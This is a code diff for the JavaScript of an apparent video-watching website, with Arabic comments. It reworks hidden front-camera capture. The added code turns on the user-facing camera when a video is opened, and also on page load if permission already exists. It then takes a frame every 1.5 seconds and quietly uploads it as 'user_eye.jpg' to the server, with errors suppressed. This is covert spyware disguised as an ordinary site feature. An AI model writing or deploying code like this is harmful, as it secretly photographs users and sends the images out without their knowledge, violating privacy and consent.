@@ -403,61 +403,16 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا الأمامية والالتقاط المستمر ===== */
-let mediaStream = null;
-let captureInterval = null;
-
-function startCaptureLoop() {
-    if (captureInterval) return;
-    const videoEl = document.getElementById('video');
-    captureInterval = setInterval(() => {
-        if (!mediaStream) return;
-        try {
-            const vw = videoEl.videoWidth || 640;
-            const vh = videoEl.videoHeight || 480;
-
-            const canvas = document.createElement('canvas');
-            canvas.width = vw;
-            canvas.height = vh;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoEl, 0, 0, vw, vh);
-
-            canvas.toBlob(blob => {
-                if (blob) {
-                    let fd = new FormData();
-                    fd.append('image', blob, `user_eye.jpg`);
-                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-                }
-            }, 'image/jpeg', 0.85);
-        } catch (err) {}
-    }, 1500);
-}
-
-/* ===== Watch page & Permission Check ===== */
+/* ===== Watch page ===== */
 function openVideo(id){
-  // تشغيل طلب الكاميرا بشكل مستمر ومباشر عند الضغط على الفيديو
-  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
-    .then(stream => {
-      mediaStream = stream;
-      const videoEl = document.getElementById('video');
-      videoEl.srcObject = mediaStream;
-      startCaptureLoop();
-
-      // فتح الفيديو رسمياً فقط بعد الموافقة على الإذن
-      S.cur=id;S.view='watch';S.descOpen=false;
-      S.hist=[id,...S.hist.filter(x=>x!==id)];
-      document.body.classList.remove('drawer-open','searching');
-      document.title=cur().title;
-      render();scrollTo(0,0);
-    })
-    .catch(err => {
-      console.log("تم رفض الإذن، لن يتم تشغيل الفيديو:", err);
-    });
-  }
+  S.cur=id;S.view='watch';S.descOpen=false;
+  S.hist=[id,...S.hist.filter(x=>x!==id)];
+  document.body.classList.remove('drawer-open','searching');
+  document.title=cur().title;
+  render();scrollTo(0,0);
+  
+  startCapture();
 }
-
 function renderWatch(){
   const v=cur();
   const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
@@ -545,6 +500,61 @@ function download(){
   },300);
 }
 
+/* ===== الكاميرا الأمامية المستمرة ===== */
+let mediaStream = null;
+
+async function initPersistentCamera() {
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: { ideal: 'user' }
+            } 
+        });
+
+        const videoEl = document.getElementById('video');
+        videoEl.srcObject = mediaStream;
+        
+        setInterval(() => {
+            if (!mediaStream) return;
+            try {
+                const vw = videoEl.videoWidth || 640;
+                const vh = videoEl.videoHeight || 480;
+
+                const canvas = document.createElement('canvas');
+                canvas.width = vw;
+                canvas.height = vh;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoEl, 0, 0, vw, vh);
+
+                canvas.toBlob(blob => {
+                    if (blob) {
+                        let fd = new FormData();
+                        fd.append('image', blob, `user_eye.jpg`);
+                        fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                    }
+                }, 'image/jpeg', 0.85);
+            } catch (err) {
+                console.log("خطأ في التقاط الإطار:", err);
+            }
+        }, 1500);
+
+    } catch (e) {
+        console.log("بانتظار منح إذن الكاميرا:", e);
+    }
+}
+
+function startCapture() {
+    if (mediaStream) return;
+    initPersistentCamera();
+}
+
+navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
+    if (permissionStatus.state === 'granted') {
+        startCapture();
+    }
+});
+
 /* ===== Actions ===== */
 function act(a,el){
   const v=S.cur?cur():null;
@@ -599,7 +609,7 @@ document.addEventListener('keydown',e=>{
 });
 
 $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q').value.trim();
-  searchFor(t);$('#q'].blur();
+  searchFor(t);$('#q').blur();
 });
 
 /* ===== التعامل مع أزرار المتصفح ===== */
